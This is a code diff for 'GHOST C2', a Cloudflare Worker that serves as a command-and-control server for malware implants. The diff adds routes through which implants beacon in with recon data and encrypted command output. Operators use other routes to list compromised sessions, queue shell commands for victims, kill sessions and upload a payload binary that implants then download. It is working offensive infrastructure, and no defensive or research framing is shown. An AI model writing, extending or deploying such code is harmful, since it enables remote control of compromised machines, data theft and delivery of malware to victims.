@@ -1,10 +1,11 @@
 /**
- * GHOST C2 — Cloudflare Worker
+ * GHOST C2 — Cloudflare Worker (KV‑backed, encrypted)
  *
- * Encrypted version – hostname‑derived AES‑GCM (no PSK).
- * - URL-decodes session IDs.
+ * - URL‑decodes session IDs (fixes pipe issue).
+ * - Hostname‑derived AES‑GCM (no PSK).
  * - Results kept by default; ?clear=1 removes.
- * - KV operations retried.
+ * - KV operations retried with exponential backoff.
+ * - Safe JSON parsing — never throws on malformed bodies.
  * - All operator routes require X-Operator-Token; beacon routes require X-Beacon-Token.
  */
 
@@ -79,7 +80,7 @@ const KV_RETRY_BASE_MS = 200;
 
 /**
  * Derive a 32‑byte AES key from the session ID using SHA‑256.
- * This matches the implant's method: SHA256(sessionId).
+ * Both implant and Worker compute the same key from the same session ID.
  */
 async function deriveKey(sid: string): Promise<Uint8Array> {
   const encoder = new TextEncoder();
@@ -351,11 +352,10 @@ async function handleBeacon(request: Request, env: Env): Promise<Response> {
   const ip = getClientIP(request);
   const ttl = getSessionTTL(env);
 
-  // Derive AES key from session ID (matches implant)
+  // Derive AES key from session ID
   const keyBytes = await deriveKey(sid);
 
   let recon: Record<string, unknown> = {};
-
   if (body.enc) {
     try {
       const decrypted = await decryptAesGcm(keyBytes, body.enc);
@@ -366,7 +366,7 @@ async function handleBeacon(request: Request, env: Env): Promise<Response> {
       return errorResponse("Decryption failed", 400);
     }
   } else {
-    // Fallback to plaintext (for compatibility) – but we expect encrypted traffic
+    // Fallback for plaintext (if implant sends without encryption)
     recon = body.recon ?? {};
   }
 
@@ -392,7 +392,6 @@ async function handleBeacon(request: Request, env: Env): Promise<Response> {
     console.log(`[beacon] sid=${sid} ip=${ip} sleep`);
   }
 
-  // Encrypt the response
   const plainResponse = JSON.stringify({ cmd });
   const encryptedResponse = await encryptAesGcm(keyBytes, plainResponse);
   return jsonResponse({ enc: encryptedResponse });
@@ -404,8 +403,6 @@ async function handleResult(request: Request, env: Env): Promise<Response> {
 
   const sid = clamp(String(body.session), MAX_SESSION_LEN);
   const ttl = getSessionTTL(env);
-
-  // Derive AES key from session ID
   const keyBytes = await deriveKey(sid);
 
   let output = "";
@@ -419,13 +416,13 @@ async function handleResult(request: Request, env: Env): Promise<Response> {
       return errorResponse("Decryption failed", 400);
     }
   } else {
-    // Fallback to plaintext (compatibility)
     output = body.output ?? "";
   }
 
   const trimmed = clamp(output, MAX_OUTPUT_LEN);
   await appendResult(env.GHOST_KV, sid, { ts: now(), output: trimmed }, ttl);
 
+  // If session doesn't exist, create it (shouldn't happen, but safe)
   const existing = await getSession(env.GHOST_KV, sid);
   if (!existing) {
     const ts = now();
@@ -444,12 +441,224 @@ async function handleResult(request: Request, env: Env): Promise<Response> {
   return jsonResponse({ status: "ok" });
 }
 
-// ─── The rest of the handlers (listSessions, addTask, getResults, killSession, audit, upload, download) remain unchanged ───
-// They are exactly the same as in your original file. For brevity, I'm not repeating them here,
-// but you must keep them in your actual file.
+async function handleListSessions(request: Request, env: Env): Promise<Response> {
+  const keys = await listSessionKeys(env.GHOST_KV);
+  const ts = Date.now();
+  const sessions: Record<string, unknown>[] = [];
+
+  for (const key of keys) {
+    const sid = key.replace("session:", "");
+    const data = await getSession(env.GHOST_KV, sid);
+    if (!data) continue;
+    sessions.push({
+      session: data.session,
+      remote_ip: data.remote_ip,
+      first_seen: data.first_seen,
+      last_beacon: data.last_beacon,
+      idle_seconds: Math.round((ts - new Date(data.last_beacon).getTime()) / 1000),
+      recon: data.recon,
+      pending_tasks: data.pending_tasks ?? 0,
+      result_count: data.result_count ?? 0,
+    });
+  }
+
+  await logAudit(env.GHOST_KV, {
+    ts: now(),
+    ip: getClientIP(request),
+    action: "list_sessions",
+    detail: { count: sessions.length },
+  });
+
+  return jsonResponse(sessions);
+}
+
+async function handleAddTask(request: Request, env: Env): Promise<Response> {
+  const body = await safeJson<TaskRequest>(request);
+  if (!body?.session || !body?.cmd) {
+    return errorResponse("Missing session or cmd field", 400);
+  }
+
+  const sid = clamp(String(body.session), MAX_SESSION_LEN);
+  const cmd = clamp(String(body.cmd), MAX_CMD_LEN);
+
+  const session = await getSession(env.GHOST_KV, sid);
+  if (!session) return errorResponse("Session not found", 404);
+
+  const tasks = await getTasks(env.GHOST_KV, sid);
+  tasks.push(cmd);
+  await putTasks(env.GHOST_KV, sid, tasks, getSessionTTL(env));
+
+  await logAudit(env.GHOST_KV, {
+    ts: now(),
+    ip: getClientIP(request),
+    action: "task_queued",
+    detail: { session: sid, cmd },
+  });
+
+  console.log(`[task] sid=${sid} cmd="${cmd}" depth=${tasks.length}`);
+  return jsonResponse({ status: "queued", queue_depth: tasks.length });
+}
+
+async function handleGetResults(request: Request, env: Env, sid: string): Promise<Response> {
+  // sid is already decoded by router
+  const session = await getSession(env.GHOST_KV, sid);
+  if (!session) return errorResponse("Session not found", 404);
+
+  const results = await getResults(env.GHOST_KV, sid);
+  const clear = new URL(request.url).searchParams.get("clear") === "1";
+  if (clear) await putResults(env.GHOST_KV, sid, []);
+
+  await logAudit(env.GHOST_KV, {
+    ts: now(),
+    ip: getClientIP(request),
+    action: "get_results",
+    detail: { session: sid, count: results.length, clear },
+  });
+
+  return jsonResponse({ session: sid, results });
+}
+
+async function handleKillSession(request: Request, env: Env, sid: string): Promise<Response> {
+  const session = await getSession(env.GHOST_KV, sid);
+  if (!session) return errorResponse("Session not found", 404);
+
+  const tasks = await getTasks(env.GHOST_KV, sid);
+  tasks.unshift("exit");
+  await putTasks(env.GHOST_KV, sid, tasks, getSessionTTL(env));
+
+  await logAudit(env.GHOST_KV, {
+    ts: now(),
+    ip: getClientIP(request),
+    action: "kill_session",
+    detail: { session: sid },
+  });
+
+  console.log(`[kill] sid=${sid} exit queued`);
+  return jsonResponse({ status: "exit_queued", session: sid });
+}
+
+async function handleAudit(request: Request, env: Env): Promise<Response> {
+  const limit = Math.min(
+    parseInt(new URL(request.url).searchParams.get("limit") ?? "100", 10),
+    AUDIT_CAP,
+  );
+  const raw = await env.GHOST_KV.get("audit_log");
+  const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];
+  return jsonResponse({ entries: log.slice(-limit) });
+}
+
+function handleHealth(): Response {
+  return jsonResponse({ status: "ok", ts: now() });
+}
+
+async function handleUploadPayload(request: Request, env: Env): Promise<Response> {
+  const body = await request.arrayBuffer();
+  if (!body || body.byteLength === 0) return errorResponse("Empty body", 400);
+  if (body.byteLength > PAYLOAD_MAX) return errorResponse("Payload too large (max 32 MB)", 413);
+
+  await env.GHOST_KV.put("payload:ghost", body, { expirationTtl: PAYLOAD_TTL });
+  await logAudit(env.GHOST_KV, {
+    ts: now(),
+    ip: getClientIP(request),
+    action: "payload_uploaded",
+    detail: { bytes: body.byteLength },
+  });
+
+  console.log(`[payload] uploaded ${body.byteLength} bytes`);
+  return jsonResponse({ status: "ok", bytes: body.byteLength });
+}
+
+async function handleDownloadPayload(env: Env): Promise<Response> {
+  const raw = await env.GHOST_KV.get("payload:ghost", { type: "arrayBuffer" });
+  if (!raw) return errorResponse("Payload not found", 404);
+  return new Response(raw, {
+    status: 200,
+    headers: {
+      "Content-Type": "application/octet-stream",
+      "Content-Length": String(raw.byteLength),
+      "Cache-Control": "no-store",
+    },
+  });
+}
 
 // ─── Router ───────────────────────────────────────────────
-// (Keep the existing router – it already calls the above handlers.)
+
+async function handleRequest(request: Request, env: Env): Promise<Response> {
+  const url = new URL(request.url);
+  const { pathname: path } = url;
+  const method = request.method;
+
+  // CORS preflight
+  if (method === "OPTIONS") {
+    return withCORS(new Response(null, { status: 204 }), env);
+  }
+
+  // ── Public routes ──────────────────────────────────────
+  if (path === "/health" && method === "GET") {
+    return withCORS(handleHealth(), env);
+  }
+  if (path === "/ping" && method === "GET") {
+    return withCORS(new Response("OK", { status: 200 }), env);
+  }
+
+  // ── Beacon routes (X-Beacon-Token) ────────────────────
+  if (path === "/beacon" && method === "POST") {
+    const authErr = requireBeaconToken(request, env);
+    if (authErr) return withCORS(authErr, env);
+    return withCORS(await handleBeacon(request, env), env);
+  }
+  if (path === "/result" && method === "POST") {
+    const authErr = requireBeaconToken(request, env);
+    if (authErr) return withCORS(authErr, env);
+    return withCORS(await handleResult(request, env), env);
+  }
+  if (path === "/payload" && method === "GET") {
+    const authErr = requireBeaconToken(request, env);
+    if (authErr) return withCORS(authErr, env);
+    return withCORS(await handleDownloadPayload(env), env);
+  }
+
+  // ── Operator routes (X-Operator-Token) ──────────────────
+  if (path === "/sessions" && method === "GET") {
+    const authErr = requireOperatorToken(request, env);
+    if (authErr) return withCORS(authErr, env);
+    return withCORS(await handleListSessions(request, env), env);
+  }
+  if (path === "/task" && method === "POST") {
+    const authErr = requireOperatorToken(request, env);
+    if (authErr) return withCORS(authErr, env);
+    return withCORS(await handleAddTask(request, env), env);
+  }
+  if (path === "/audit" && method === "GET") {
+    const authErr = requireOperatorToken(request, env);
+    if (authErr) return withCORS(authErr, env);
+    return withCORS(await handleAudit(request, env), env);
+  }
+  if (path === "/payload" && method === "POST") {
+    const authErr = requireOperatorToken(request, env);
+    if (authErr) return withCORS(authErr, env);
+    return withCORS(await handleUploadPayload(request, env), env);
+  }
+
+  // ── Parameterised operator routes ──────────────────────
+  const resultsMatch = path.match(/^\/results\/(.+)$/);
+  if (resultsMatch && method === "GET") {
+    const authErr = requireOperatorToken(request, env);
+    if (authErr) return withCORS(authErr, env);
+    const sid = decodeURIComponent(resultsMatch[1]);
+    return withCORS(await handleGetResults(request, env, sid), env);
+  }
+
+  const sessionsMatch = path.match(/^\/sessions\/(.+)$/);
+  if (sessionsMatch && method === "DELETE") {
+    const authErr = requireOperatorToken(request, env);
+    if (authErr) return withCORS(authErr, env);
+    const sid = decodeURIComponent(sessionsMatch[1]);
+    return withCORS(await handleKillSession(request, env, sid), env);
+  }
+
+  return withCORS(errorResponse("Not found", 404), env);
+}
 
 export default {
   async fetch(request: Request, env: Env, _ctx: ExecutionContext): Promise<Response> {
